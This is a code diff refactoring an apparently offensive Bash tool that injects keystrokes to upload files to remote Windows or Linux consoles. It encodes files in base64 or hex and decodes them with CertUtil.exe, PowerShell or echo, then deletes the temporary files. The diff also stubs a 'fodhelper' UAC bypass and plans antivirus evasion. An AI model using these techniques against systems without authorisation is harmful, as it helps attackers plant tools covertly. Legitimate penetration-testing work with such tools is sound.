-    	elif [[ "${mode}" == "console" ]]
-    	then
-            print_status "progress" "Transferring file..."
+       	elif [[ "${mode}" == "console" ]]
+       	then
+            info "Transferring file..."
 
             # Split a pair of characters and make it into a hexadecimal format.
-            for (( i=0; i<${#data}; i+=2))
+            for ((i = 0; i < ${#data}; i += 2))
             do
                 temp+="\\x${data:i:2}"
             done
 
-            for (( i=0; i<${#temp}; i+=chunks ))
+            for ((i = 0; i < ${#temp}; i += chunks))
             do
-                if [[ ${i} -eq 0 ]]
+                if ((i == 0))
                 then
                     keyboard "${random_variable}=\"${temp:i:chunks}\"" "keystrokes"
                     keyboard "Return" "custom_keystroke"
@@ -516,218 +725,190 @@ function base2_radix() {
                     keyboard "Return" "custom_keystroke"
                 fi
             done
-
             # Interpret the backslash to output into a file.
-            keyboard "echo -en \$${random_variable} > \"${output_file}\"" "keystrokes"
+            keyboard "echo -en \$${random_variable} > \"${remote_file}\"" "keystrokes"
             keyboard "Return" "custom_keystroke"
-    	fi
-        print_status "completed" "File transferred!"
-    fi
-}
+       	fi
+        finish "File transferred!"
+    }
+    # Using decimals to encode files
+    function base10() {
+        local mode="${1}"
+        local action="${2}"
+        local random_variable=$(random_string)
+        chunks=100
 
-# Using decimals to encode files
-function base10_radix() {
-    local input="${1}"
-    local output_file="${2}"
-    local mode="${3}"
-    local data
-    local chunks=100
-    local random_variable=$(random_string)
-    local temp
+        # TODO: Implement this feature for both linux and powershell cmdlet
+        # $ printf
+        echo "not yet implemented"
+        if [[ -f "${local_file}" ]]
+        then
+        	if [[ "${mode}" == "powershell" ]]
+        	then
+                info "Transferring file..."
 
-    # TODO: Implement this feature for both linux and powershell cmdlet
-    # $ printf
-    echo "not yet implemented"
-    if [[ -f "${input}" ]]
-    then
-    	if [[ "${mode}" == "powershell" ]]
-    	then
-            print_status "progress" "Transferring file..."
-
-        for (( i=0; i<${#data}; i+=chunks ))
-        do
-            if [[ ${i} -eq 0 ]]
-            then
-                keyboard "\$${random_variable} = \"${data:i:chunks}\"" "keystrokes"
-                keyboard "Return" "custom_keystroke"
-            else
-                keyboard "\$${random_variable} += \"${data:i:chunks}\"" "keystrokes"
-                keyboard "Return" "custom_keystroke"
-            fi
-        done
-            # TODO: Change this from binary to decimal
-            keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", (\$${random_variable} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "keystrokes"
-            keyboard "Return" "custom_keystroke"
-    	elif [[ "${mode}" == "console" ]]
-    	then
-            print_status "progress" "Transferring file..."
-
-            # TODO: Change this from binary to decimal
-            # Split a pair of characters and make it into a hexadecimal format.
-            for (( i=0; i<${#data}; i+=2))
+            for ((i = 0; i < ${#data}; i += chunks))
             do
-                temp+="\\x${data:i:2}"
-            done
-
-            for (( i=0; i<${#temp}; i+=chunks ))
-            do
-                if [[ ${i} -eq 0 ]]
+                if ((i == 0))
                 then
-                    keyboard "${random_variable}=\"${temp:i:chunks}\"" "keystrokes"
+                    keyboard "\$${random_variable} = \"${data:i:chunks}\"" "keystrokes"
                     keyboard "Return" "custom_keystroke"
                 else
-                    keyboard "${random_variable}+=\"${temp:i:chunks}\"" "keystrokes"
+                    keyboard "\$${random_variable} += \"${data:i:chunks}\"" "keystrokes"
                     keyboard "Return" "custom_keystroke"
                 fi
             done
-
-            # Interpret the backslash to output into a file.
-            keyboard "echo -en \$${random_variable} > \"${output_file}\"" "keystrokes"
-            keyboard "Return" "custom_keystroke"
-    	fi
-        print_status "completed" "File transferred!"
-    fi
-}
-
-# Using octals to encode files
-function base8_radix() {
-    local input="${1}"
-    local output_file="${2}"
-    local mode="${3}"
-    local data
-    local chunks=100
-    local random_variable=$(random_string)
-    local temp
-
-    # TODO: Implement this feature for both linux and powershell cmdlet
-    # $ od -A n -t o1 -v file.txt | tr -d "[:space:]"
-    echo "not implemented"
-    if [[ -f "${input}" ]]
-    then
-    	if [[ "${mode}" == "powershell" ]]
-    	then
-            print_status "progress" "Transferring file..."
-
-        for (( i=0; i<${#data}; i+=chunks ))
-        do
-            if [[ ${i} -eq 0 ]]
-            then
-                keyboard "\$${random_variable} = \"${data:i:chunks}\"" "keystrokes"
+                # TODO: Change this from binary to decimal
+                # and make a VARIANT either none or one-liner
+                keyboard "[IO.File]::WriteAllBytes(\"${remote_file}\", (\$${random_variable} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "keystrokes"
                 keyboard "Return" "custom_keystroke"
-            else
-                keyboard "\$${random_variable} += \"${data:i:chunks}\"" "keystrokes"
+        	elif [[ "${mode}" == "console" ]]
+        	then
+                info "Transferring file..."
+
+                # TODO: Change this from binary to decimal
+                # Split a pair of characters and make it into a hexadecimal format.
+                for ((i = 0; i < ${#data}; i += 2))
+                do
+                    temp+="\\x${data:i:2}"
+                done
+
+                for (( i = 0; i < ${#temp}; i += chunks))
+                do
+                    if ((i == 0))
+                    then
+                        keyboard "${random_variable}=\"${temp:i:chunks}\"" "keystrokes"
+                        keyboard "Return" "custom_keystroke"
+                    else
+                        keyboard "${random_variable}+=\"${temp:i:chunks}\"" "keystrokes"
+                        keyboard "Return" "custom_keystroke"
+                    fi
+                done
+                # Interpret the backslash to output into a file.
+                keyboard "echo -en \$${random_variable} > \"${remote_file}\"" "keystrokes"
                 keyboard "Return" "custom_keystroke"
-            fi
-        done
+        	fi
+            finish "File transferred!"
+        fi
+    }
+    # Using octals to encode files
+    function base8() {
+        local random_variable=$(random_string)
+        chunks=100
 
-            keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", (\$${random_variable} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "keystrokes"
-            keyboard "Return" "custom_keystroke"
-    	elif [[ "${mode}" == "console" ]]
-    	then
-            print_status "progress" "Transferring file..."
+        # TODO: Implement this feature for both linux and powershell cmdlet
+        # $ od -A n -t o1 -v file.txt | tr -d "[:space:]" (https://github.com/RoseSecurity/Anti-Virus-Evading-Payloads/blob/main/Bypass-AV-Payload-Detection.md)
+        echo "not implemented"
+        if [[ -f "${local_file}" ]]
+        then
+        	if [[ "${mode}" == "powershell" ]]
+        	then
+                info "Transferring file..."
 
-            # Split a pair of characters and make it into a hexadecimal format.
-            for (( i=0; i<${#data}; i+=2))
-            do
-                temp+="\\x${data:i:2}"
-            done
+                for ((i = 0; i < ${#data}; i += chunks))
+                do
+                    if ((i == 0))
+                    then
+                        keyboard "\$${random_variable} = \"${data:i:chunks}\"" "keystrokes"
+                        keyboard "Return" "custom_keystroke"
+                    else
+                        keyboard "\$${random_variable} += \"${data:i:chunks}\"" "keystrokes"
+                        keyboard "Return" "custom_keystroke"
+                    fi
+                done
+                # TODO: and make a VARIANT either none or one-liner
+                keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", (\$${random_variable} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "keystrokes"
+                keyboard "Return" "custom_keystroke"
+        	elif [[ "${mode}" == "console" ]]
+        	then
+                info "Transferring file..."
 
-            for (( i=0; i<${#temp}; i+=chunks ))
-            do
-                if [[ ${i} -eq 0 ]]
-                then
-                    keyboard "${random_variable}=\"${temp:i:chunks}\"" "keystrokes"
-                    keyboard "Return" "custom_keystroke"
-                else
-                    keyboard "${random_variable}+=\"${temp:i:chunks}\"" "keystrokes"
-                    keyboard "Return" "custom_keystroke"
-                fi
-            done
+                # Split a pair of characters and make it into a hexadecimal format.
+                for ((i = 0; i < ${#data}; i += 2))
+                do
+                    temp+="\\x${data:i:2}"
+                done
 
-            # Interpret the backslash to output into a file.
-            keyboard "echo -en \$${random_variable} > \"${output_file}\"" "keystrokes"
-            keyboard "Return" "custom_keystroke"
-    	fi
-        print_status "completed" "File transferred!"
-    fi
-}
+                for ((i = 0; i < ${#temp}; i += chunks))
+                do
+                    if ((i == 0))
+                    then
+                        keyboard "${random_variable}=\"${temp:i:chunks}\"" "keystrokes"
+                        keyboard "Return" "custom_keystroke"
+                    else
+                        keyboard "${random_variable}+=\"${temp:i:chunks}\"" "keystrokes"
+                        keyboard "Return" "custom_keystroke"
+                    fi
+                done
+                # Interpret the backslash to output into a file.
+                keyboard "echo -en \$${random_variable} > \"${remote_file}\"" "keystrokes"
+                keyboard "Return" "custom_keystroke"
+        	fi
+            finish "File transferred!"
+        fi
+    }
 
-function output_variable() {
-    local input="${1}"
-    local output_file="${2}"
-    local mode="${3}"
-    local file_character_set=$(file --mime-encoding "${input}")
-    local file_type=${file_character_set##*: }
-    local lines=$(count_lines "${input}")
-    local data
-    local chunks=100
-    local encoded=()
-    local counter
-    local random_temp_file=$(random_string)
-    local directory_path=$(directory_name "${output_file}")
+    function output_variable() {
+        local mode="${1}"
+        chunks=100
 
-    if [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
-    then
-        print_status "error" "Only windows and linux are supported for this method!"
-        print_status "information" "Terminating program..."
-        exit 1
-    fi
+        if [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
+        then
+            error "Only windows and linux are supported for this method!"
+            quit 1
+        fi
 
-    if [[ -f "${input}" ]]
-    then
         if [[ "${mode}" == "text" && "${file_type}" != "binary" ]]
         then
-            print_status "progress" "Checking one of the lines reaches 3477 character limit"
+            info "Checking one of the lines reaches 3477 character limit"
             while read -r line
             do
-                length=${#line}
-                if [[ ${length} -ge 3477 ]]
+                if ((${#line} == 3477))
                 then
-                    print_status "error" "Character Limit reached!"
-                    print_status "information" "Use 'outfileb64' as a method instead."
-                    print_status "information" "Terminating program..."
-                    exit 1
+                    error "Character Limit reached!"
+                    info "Use 'outfileb64' as a method instead."
+                    quit 1
                 fi
-            done < "${input}"
+            done < "${local_file}"
 
-            print_status "progress" "Transferring file..."
+            info "Transferring file..."
             keyboard "@'" "escape_keystrokes"
             keyboard "Return" "custom_keystroke"
             while read -r line
             do
                 keyboard "${line}" "keystrokes"
                 keyboard "Return" "custom_keystroke"
-            done < "${input}"
+            done < "${local_file}"
 
-            keyboard "'@ | Out-File ${output_file}" "escape_keystrokes"
+            keyboard "'@ | Out-File ${remote_file}" "escape_keystrokes"
             keyboard "Return" "custom_keystroke"
         elif [[ "${mode}" == "text" && "${file_type}" == "binary" ]]
         then
-            print_status "warning" "This is a binary file! Switching to 'outfileb64' method instead..."
-            powershell_outfile "${input}" "${output_file}" "${platform}" "certutil"
-            exit 1
+            # TODO: Refactor
+            warn "This is a binary file! Switching to 'outfileb64' method instead..."
+            output_variable "base64"
+            quit 1
         elif [[ "${mode}" == "base64" ]]
         then
             chunks=64
 
             if [[ "${PLATFORM}" != "windows" ]]
             then
-                print_status "error" "This method is exclusively used for windows because it relies on 'CertUtil.exe'."
-                print_status "information" "Use 'nixb64' method instead."
-                print_status "information" "Terminating program..."
-                exit 1
+                error "This method is exclusively used for windows because it relies on 'CertUtil.exe'."
+                info "Use 'nixb64' method instead."
+                quit 1
             fi
 
-            print_status "progress" "Transferring file..."
-            data=$(basenc -w 0 --base64 "${input}")
+            info "Transferring file..."
+            data=$(basenc -w 0 --base64 "${local_file}")
             keyboard "@'" "escape_keystrokes"
             keyboard "Return" "custom_keystroke"
             keyboard "-----BEGIN CERTIFICATE-----" "escape_keystrokes"
             keyboard "Return" "custom_keystroke"
 
-            for (( i=0; i<${#data}; i+=chunks ))
+            for ((i = 0; i < ${#data}; i += chunks))
             do
-                if [[ ${i} -eq 0 ]]
+                if ((i == 0))
                 then
                     keyboard "${data:i:chunks}" "keystrokes"
                     keyboard "Return" "custom_keystroke"
@@ -739,42 +920,42 @@ function output_variable() {
 
             keyboard "-----END CERTIFICATE-----" "escape_keystrokes"
             keyboard "Return" "custom_keystroke"
-            keyboard "'@ | Out-File \"${directory_path}\\${random_temp}.txt\"" "escape_keystrokes"
+            keyboard "'@ | Out-File \"${directory_path}\\${temporary_file}.txt\"" "escape_keystrokes"
             keyboard "Return" "custom_keystroke"
-            keyboard "CertUtil.exe -f -decode \"${directory_path}\\${random_temp_file}.txt\" ${output_file}" "keystrokes"
+            keyboard "CertUtil.exe -f -decode \"${directory_path}\\${temporary_file}.txt\" ${remote_file}" "keystrokes"
             keyboard "Return" "custom_keystroke"
-            keyboard "Remove-Item -Force \"${directory_path}\\${random_temp_file}.txt\"" "keystrokes"
+            keyboard "Remove-Item -Force \"${directory_path}\\${temporary_file}.txt\"" "keystrokes"
             keyboard "Return" "custom_keystroke"
         elif [[ "${mode}" == "hex" ]]
         then
-            print_status "progress" "Transferring file..."
-            data=$(basenc -w 0 --base16 "${input}")
+            info "Transferring file..."
+            data=$(basenc -w 0 --base16 "${local_file}")
 
             # Append the pair of hexadecimal characters in a array
-            for (( i=0; i<${#data}; i+=2 ))
+            for ((i = 0; i < ${#data}; i += 2))
             do
-            	encoded+=("${data:i:2}")
+               	encoded+=("${data:i:2}")
             done
 
             keyboard "@'" "escape_keystrokes"
             keyboard "Return" "custom_keystroke"
 
             counter=0
-            for ((i=0; i<${#encoded[@]}; i++))
+            for ((i = 0; i < ${#encoded[@]}; i++))
             do
-                if [[ ${counter} -eq 7 ]]
+                if ((counter == 7))
                 then
                     keyboard "${encoded[i]}" "keystrokes"
                     keyboard "space" "custom_keystroke"
-                elif [[ ${counter} -eq 8 ]]
+                elif ((counter == 8))
                 then
                     keyboard "space" "custom_keystroke"
                     (( counter++ ))
-                elif [[ ${counter} -eq 15 ]]
+                elif ((counter == 15))
                 then
                     keyboard "${encoded[i]}" "keystrokes"
                     keyboard "Return" "custom_keystroke"
-                elif [[ ${i} -eq $((${#encoded[@]} - 1)) ]]
+                elif ((i == ${#encoded[@]} - 1))
                 then
                     keyboard "${encoded[i]}" "keystrokes"
                     keyboard "Return" "custom_keystroke"
@@ -783,31 +964,30 @@ function output_variable() {
                     keyboard "space" "custom_keystroke"
                 fi
 
-                if [[ ${counter} -eq 15 ]]
+                if ((counter == 15))
                 then
                     counter=0
                 else
-                    (( counter++ ))
+                    ((counter++))
                 fi
             done
-            keyboard "'@ | Out-File \"${directory_path}\\${random_temp_file}.hex\"" "escape_keystrokes"
+            keyboard "'@ | Out-File \"${directory_path}\\${temporary_file}.hex\"" "escape_keystrokes"
             keyboard "Return" "custom_keystroke"
-            keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp_file}.hex\" \"${output_file}\" 4" "keystrokes"
+            keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${temporary_file}.hex\" \"${remote_file}\" 4" "keystrokes"
             keyboard "Return" "custom_keystroke"
-            keyboard "Remove-Item -Force \"${directory_path}\\${random_temp_file}.hex\"" "keystrokes"
+            keyboard "Remove-Item -Force \"${directory_path}\\${temporary_file}.hex\"" "keystrokes"
             keyboard "Return" "custom_keystroke"
         elif [[ "${mode}" == "console" ]]
         then
             # TODO: Test it.
             if [[ "${PLATFORM}" != "linux" ]]
             then
-                print_status "error" "This method is exclusively used for unix because it relies on 'echo'."
-                print_status "information" "Use 'outfile' method instead."
-                print_status "information" "Terminating program..."
-                exit 1
+                error "This method is exclusively used for unix because it relies on 'echo'."
+                info "Use 'outfile' method instead."
+                quit 1
             fi
 
-            print_status "progress" "Transferring file..."
+            info "Transferring file..."
             # TODO: Add this in the if statement for the first line.
             # echo "inserting lines...
             keyboard "echo \"" "escape_keystrokes"
@@ -816,16 +996,16 @@ function output_variable() {
             counter=1
             while read -r line
             do
-                if [[ ${counter} -ne ${lines} ]]
+                if ((counter != lines))
                 then
                     keyboard "${line}" "escape_keystrokes"
                     keyboard "Return" "custom_keystroke"
                 else
-                    keyboard "${line}\" > ${output_file}" "escape_keystrokes"
+                    keyboard "${line}\" > ${remote_file}" "escape_keystrokes"
                     keyboard "Return" "custom_keystroke"
                 fi
-                (( counter++ ))
-            done < "${input}"
+                ((counter++))
+            done < "${local_file}"
 
         elif [[ "${mode}" == "consoleb64" ]]
         then
@@ -833,595 +1013,551 @@ function output_variable() {
             chunks=64
             if [[ "${PLATFORM}" != "linux" ]]
             then
-                print_status "error" "This method is exclusively used for unix because it relies on 'echo'."
-                print_status "information" "Use 'outfileb64' method instead."
-                print_status "information" "Terminating program..."
-                exit 1
+                error "This method is exclusively used for unix because it relies on 'echo'."
+                info "Use 'outfileb64' method instead."
+                quit 1
             fi
 
-            print_status "progress" "Transferring file..."
-            data=$(basenc -w 0 --base64 "${input}")
+            info "Transferring file..."
+            data=$(basenc -w 0 --base64 "${local_file}")
             # TODO: Add this in the if statement for the first line.
             # echo "inserting lines...
             keyboard "echo \"" "escape_keystrokes"
             keyboard "Return" "custom_keystroke"
 
-            for (( i=0; i<${#data}; i+=chunks ))
+            for ((i = 0; i < ${#data}; i += chunks))
             do
-                if [[ ${i} -eq 0 ]]
+                if ((i == 0))
                 then
                     keyboard "${data:i:chunks}" "escape_keystrokes"
                     keyboard "Return" "custom_keystroke"
                 else
-                    keyboard "${data:i:chunks}\" > ${output_file}" "escape_keystrokes"
+                    keyboard "${data:i:chunks}\" > ${remote_file}" "escape_keystrokes"
                     keyboard "Return" "custom_keystroke"
                 fi
             done
-            # TODO: Add a flag for legacy command "base64 -d -w 0"
-            keyboard "basenc -w 0 -d --base64 \"${directory_path}/${random_temp_file}.txt\" > \"${output_file}\"" "escape_keystrokes"
+            # TODO: Add a flag for legacy -s,--submethod command "base64 -d -w 0"
+            keyboard "basenc -w 0 -d --base64 \"${directory_path}/${temporary_file}.txt\" > \"${remote_file}\"" "escape_keystrokes"
             keyboard "Return" "custom_keystroke"
-            keyboard "rm -f \"${directory_path}\\${random_temp_file}.txt\"" "escape_keystrokes"
+            keyboard "rm -f \"${directory_path}\\${temporary_file}.txt\"" "escape_keystrokes"
             keyboard "Return" "custom_keystroke"
         fi
-    fi
 
-    print_status "completed" "File transferred!"
-}
+        finish "File transferred!"
+    }
 
-function copy_con() {
-    local input="${1}"
-    local output_file="${2}"
-    local mode="${3}"
-    local file_character_set=$(file --mime-encoding "${input}")
-    local file_type=${file_character_set##*: }
-    local lines=$(count_lines "${input}")
-    local data
-    local chunks
-    local encoded=()
-    local counter
-    local random_temp_file=$(random_string)
-    local directory_path=$(directory_name "${output_file}")
+    function copy_con() {
+        local mode="${1}"
 
-    if [[ "${PLATFORM}" != "windows" ]]
-    then
-        print_status "error" "copycon only exists on Windows operating system!"
-        print_status "information" "Use 'pwshb64' method instead."
-        print_status "information" "Terminating program..."
-        exit 1
-    fi
-
-    if [[ -f "${input}" && "${mode}" == "text" ]]
-    then
-        print_status "progress" "Checking one of the lines reaches 255 character limit"
-        while read -r line
-        do
-            if [[ ${#line} -ge 255 ]]
-            then
-                print_status "error" "Character Limit reached!"
-                print_status "information" "Use 'cmdb64' as a method instead."
-                print_status "information" "Terminating program..."
-                exit 1
-            fi
-        done < "${input}"
-
-        print_status "progress" "Transferring file..."
-        keyboard "copy con /y ${output_file}" "keystrokes"
-        keyboard "Return" "custom_keystroke"
-
-        counter=1
-        while read -r line
-        do
-            if [[ ${counter} -ne ${lines} ]]
-            then
-                keyboard "${line}" "escape_keystrokes"
-                keyboard "Return" "custom_keystroke"
-            else
-                keyboard "${line}" "escape_keystrokes"
-                keyboard "Ctrl+Z" "custom_keystroke"
-                keyboard "Return" "custom_keystroke"
-            fi
-            (( counter++ ))
-        done < "${input}"
-    elif [[ "${mode}" == "base64" ]]
-    then
-        chunks=64
-
-        if [[ "${file_type}" == "binary" ]]
+        if [[ "${PLATFORM}" != "windows" ]]
         then
-            data=$(basenc -w 0 --base64 "${input}")
-        else
-            data=$(iconv -f ASCII -t UTF-16LE "${input}" | basenc -w 0 --base64)
+            error "copycon only exists on Windows operating system!"
+            info "Use 'pwshb64' method instead."
+            quit 1
         fi
 
-        print_status "progress" "Transferring file..."
-        keyboard "copy con /y \"${directory_path}\\${random_temp_file}.txt\"" "keystrokes"
-        keyboard "Return" "custom_keystroke"
-        keyboard "-----BEGIN CERTIFICATE-----" "escape_keystrokes"
-        keyboard "Return" "custom_keystroke"
+        if [[ "${mode}" == "text" ]]
+        then
+            info "Checking one of the lines reaches 255 character limit"
+            while read -r line
+            do
+                if ((${#line} == 255))
+                then
+                    error "Character Limit reached!"
+                    info "Use 'cmdb64' as a method instead."
+                    quit 1
+                fi
+            done < "${local_file}"
 
-        for (( i=0; i<${#data}; i+=chunks ))
-        do
-            if [[ ${i} -eq 0 ]]
+            info "Transferring file..."
+            keyboard "copy con /y ${remote_file}" "keystrokes"
+            keyboard "Return" "custom_keystroke"
+
+            counter=1
+            while read -r line
+            do
+                if ((counter != lines))
+                then
+                    keyboard "${line}" "escape_keystrokes"
+                    keyboard "Return" "custom_keystroke"
+                else
+                    keyboard "${line}" "escape_keystrokes"
+                    keyboard "Ctrl+Z" "custom_keystroke"
+                    keyboard "Return" "custom_keystroke"
+                fi
+                ((counter++))
+            done < "${local_file}"
+        elif [[ "${mode}" == "base64" ]]
+        then
+            chunks=64
+            if [[ "${file_type}" == "binary" ]]
             then
-                keyboard "${data:i:chunks}" "keystrokes"
-                keyboard "Return" "custom_keystroke"
+                data=$(basenc -w 0 --base64 "${local_file}")
             else
-                keyboard "${data:i:chunks}" "keystrokes"
-                keyboard "Return" "custom_keystroke"
+                data=$(iconv -f ASCII -t UTF-16LE "${local_file}" | basenc -w 0 --base64)
             fi
-        done
 
-        keyboard "-----END CERTIFICATE-----" "keystrokes"
-        keyboard "Ctrl+Z" "custom_keystroke"
-        keyboard "Return" "custom_keystroke"
-        keyboard "CertUtil.exe -f -decode \"${directory_path}\\${random_temp_file}.txt\" ${output_file}" "keystrokes"
-        keyboard "Return" "custom_keystroke"
-        keyboard "del /f \"${directory_path}\\${random_temp_file}.txt\"" "keystrokes"
-        keyboard "Return" "custom_keystroke"
-    elif [[ "${mode}" == "hex" ]]
+            info "Transferring file..."
+            keyboard "copy con /y \"${directory_path}\\${temporary_file}.txt\"" "keystrokes"
+            keyboard "Return" "custom_keystroke"
+            keyboard "-----BEGIN CERTIFICATE-----" "escape_keystrokes"
+            keyboard "Return" "custom_keystroke"
+
+            for ((i = 0; i < ${#data}; i += chunks))
+            do
+                if ((i == 0))
+                then
+                    keyboard "${data:i:chunks}" "keystrokes"
+                    keyboard "Return" "custom_keystroke"
+                else
+                    keyboard "${data:i:chunks}" "keystrokes"
+                    keyboard "Return" "custom_keystroke"
+                fi
+            done
+
+            keyboard "-----END CERTIFICATE-----" "keystrokes"
+            keyboard "Ctrl+Z" "custom_keystroke"
+            keyboard "Return" "custom_keystroke"
+            keyboard "CertUtil.exe -f -decode \"${directory_path}\\${temporary_file}.txt\" ${remote_file}" "keystrokes"
+            keyboard "Return" "custom_keystroke"
+            keyboard "del /f \"${directory_path}\\${temporary_file}.txt\"" "keystrokes"
+            keyboard "Return" "custom_keystroke"
+        elif [[ "${mode}" == "hex" ]]
+        then
+        	info "Transferring file..."
+            data=$(basenc -w 0 --base16 "${local_file}")
+
+            # Append the pair of hexadecimal characters in a array
+            for ((i = 0; i < ${#data}; i += 2))
+            do
+                encoded+=("${data:i:2}")
+            done
+
+            keyboard "copy con /y \"${directory_path}\\${temporary_file}.hex\"" "keystrokes"
+            keyboard "Return" "custom_keystroke"
+
+            counter=0
+            for ((i = 0; i < ${#encoded[@]}; i++))
+            do
+                if ((counter == 7))
+                then
+                    keyboard "${encoded[i]}" "keystrokes"
+                    keyboard "space" "custom_keystroke"
+                elif ((counter == 8))
+                then
+                    keyboard "space" "custom_keystroke"
+                    ((counter++))
+                elif ((counter == 15))
+                then
+                    keyboard "${encoded[i]}" "keystrokes"
+                    keyboard "Return" "custom_keystroke"
+                elif ((i == ${#encoded[@]} - 1))
+                then
+                    keyboard "${encoded[i]}" "keystrokes"
+                    keyboard "Ctrl+Z" "custom_keystroke"
+                    keyboard "Return" "custom_keystroke"
+                else
+                   	keyboard "${encoded[i]}" "keystrokes"
+                   	keyboard "space" "custom_keystroke"
+                fi
+
+                if ((counter == 15))
+                then
+                    counter=0
+                else
+                    ((counter++))
+                fi
+            done
+
+            keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${temporary_file}.hex\" \"${remote_file}\" 4" "keystrokes"
+            keyboard "Return" "custom_keystroke"
+            keyboard "del /f \"${directory_path}\\${temporary_file}.hex\"" "keystrokes"
+            keyboard "Return" "custom_keystroke"
+        fi
+
+        finish "File transferred!"
+    }
+    if [[ ! -f "${local_file}" ]]
     then
-    	print_status "progress" "Transferring file..."
-        data=$(basenc -w 0 --base16 "${input}")
-
-        # Append the pair of hexadecimal characters in a array
-        for (( i=0; i<${#data}; i+=2 ))
-        do
-            encoded+=("${data:i:2}")
-        done
-
-        keyboard "copy con /y \"${directory_path}\\${random_temp_file}.hex\"" "keystrokes"
-        keyboard "Return" "custom_keystroke"
-
-        counter=0
-        for ((i=0; i<${#encoded[@]}; i++))
-        do
-            if [[ ${counter} -eq 7 ]]
-            then
-                keyboard "${encoded[i]}" "keystrokes"
-                keyboard "space" "custom_keystroke"
-            elif [[ ${counter} -eq 8 ]]
-            then
-                keyboard "space" "custom_keystroke"
-                (( counter++ ))
-            elif [[ ${counter} -eq 15 ]]
-            then
-                keyboard "${encoded[i]}" "keystrokes"
-                keyboard "Return" "custom_keystroke"
-            elif [[ ${i} -eq $((${#encoded[@]} - 1)) ]]
-            then
-                keyboard "${encoded[i]}" "keystrokes"
-                keyboard "Ctrl+Z" "custom_keystroke"
-                keyboard "Return" "custom_keystroke"
-            else
-               	keyboard "${encoded[i]}" "keystrokes"
-               	keyboard "space" "custom_keystroke"
-            fi
-
-            if [[ ${counter} -eq 15 ]]
-            then
-                counter=0
-            else
-                (( counter++ ))
-            fi
-        done
-
-        keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp_file}.hex\" \"${output_file}\" 4" "keystrokes"
-        keyboard "Return" "custom_keystroke"
-        keyboard "del /f \"${directory_path}\\${random_temp_file}.hex\"" "keystrokes"
-        keyboard "Return" "custom_keystroke"
+        error "The file does not exist!"
+        quit 1
     fi
+: <<-'COMMENT'
+TODO: Implement action for alternatives commands, such as "compression" (gzip)
+and evasion for implementating encryption
 
-    print_status "completed" "File transferred!"
-}
+Add more upload methods Base2, Base8, Base10, Unicode hex 4, Unicode hex 8
 
-function upload() {
-    local local_file="${1}"
-    local remote_file="${2}"
-    local method="${4}"
-    local action="${5}"
-    local evasion="${6}"
-
-    # TODO: Implement action for alternatives commands, such as "compression" (gzip)
-    # and evasion for implementating encryption
-
-    # Add more upload methods Base2, Base8, Base10
-
+Add editor as a upload method by using notepad.exe in windows
+Either the VARIANT will be dialogbox or searchbox
+COMMENT
     case "${method}" in
-        "" | pwshb64)
-            base64_encoding_scheme "${local_file}" "${remote_file}" "powershell" "${action}" "${evasion}"
+        "" | "pwshb64")
+            _base64 "powershell" "${action}" "${evasion}"
             ;;
-        cmdb64)
-            copy_con "${local_file}" "${remote_file}" "base64"
+        "cmdb64")
+            copy_con "base64"
             ;;
-        nixb64)
-            base64_encoding_scheme "${local_file}" "${remote_file}" "console" "${action}"
+        "nixb64")
+            _base64 "console" "${action}"
             ;;
-        outfile)
-            output_variable "${local_file}" "${remote_file}" "text"
+        "outfile")
+            output_variable "text"
             ;;
-        outfileb64)
-            output_variable "${local_file}" "${remote_file}" "base64"
+        "outfileb64")
+            output_variable "base64"
             ;;
-        echofile)
-            output_variable "${local_file}" "${remote_file}" "console"
+        "echofile")
+            output_variable "console"
             ;;
-        echofileb64)
-            output_variable "${local_file}" "${remote_file}" "consoleb64"
+        "echofileb64")
+            output_variable "consoleb64"
             ;;
-        copycon)
-            copy_con "${local_file}" "${remote_file}" "text"
+        "copycon")
+            copy_con "text"
             ;;
-        pwshhex)
-            base16_radix "${local_file}" "${remote_file}" "powershell"
+        "pwshhex")
+            base16 "powershell"
             ;;
-        cmdhex)
-            base16_radix "${local_file}" "${remote_file}" "certutil"
+        "cmdhex")
+            base16 "certutil"
             ;;
-        copyconhex)
-            copy_con "${local_file}" "${remote_file}" "hex"
+        "copyconhex")
+            copy_con "hex"
             ;;
-        nixhex)
-            base16_radix "${local_file}" "${remote_file}" "console"
+        "nixhex")
+            base16 "console"
             ;;
-        outfilehex)
-            output_variable "${local_file}" "${remote_file}" "hex"
+        "outfilehex")
+            output_variable "hex"
             ;;
         *)
-            print_status "error" "Invalid File Transfer Technique!" >&2
-            print_status "information" "Available methods are: pwshb64, cmdb64, nixb64, outfile, outfileb64, echofile, echofileb64, copycon, pwshhex, cmdhex, copyconhex, nixhex, and outfilehex"
-            print_status "information" "Terminating program..."
-            exit 1
+            error "Invalid File Transfer Technique!" >&2
+            info "Available methods are: pwshb64, cmdb64, nixb64, outfile, outfileb64, echofile, echofileb64, copycon, pwshhex, cmdhex, copyconhex, nixhex, and outfilehex"
+            quit 1
             ;;
     esac
 }
 
-function bypassuac() {
-    local action="${1}"
-    read -d '' description << EOF
-Fill in the description of the technique
-EOF
-
-    if [[ "${PLATFORM}" != "windows" ]]
-    then
-        print_status "error" "This execution method is only exclusive for windows!"
-        print_status "information" "Terminating program..."
-        exit 1
-    fi
-
-    echo "not implemented"
-}
-
 function elevate() {
-    local elevate_method="${1}"
-    local elevate_action="${2}"
+    local method="${1}"
+    local action="${2}"
+
+    function bypassuac() {
+        read -rd '' description <<-'EOF'
+        Fill in the description of the technique
+        EOF
+
+        if [[ "${PLATFORM}" != "windows" ]]
+        then
+            error "UAC only exists on Windows operating system!"
+            quit 1
+        fi
+
+        if [[ ${action} == "fodhelper" ]]
+        then
+            echo ""
+        fi
+    }
     # TODO: add -a, --action flag
     # -a info -p <windows | linux> -m bypassuac
 
     # TODO: Print out information with commands to instruct the user both commands and cmdlet
     # Add a cleanup method
